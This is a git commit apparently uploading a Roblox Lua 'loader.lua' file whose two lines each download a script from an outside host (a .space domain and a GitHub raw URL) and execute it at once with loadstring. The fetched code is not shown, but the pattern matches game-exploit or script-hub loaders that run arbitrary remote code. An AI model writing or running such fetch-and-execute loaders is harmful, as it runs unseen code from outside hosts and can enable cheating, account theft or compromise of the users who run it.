15f0db2149033a3f8c8f5489a1b667df0f78a319
azurkxo <140209544+azurkxo@users.noreply.github.com>
2024-12-29 23:39:10 +0200

    Add files via upload

---
+++ loader.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://egorikusa.space/2c0bd95f31d1e034601dd157.lua", true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
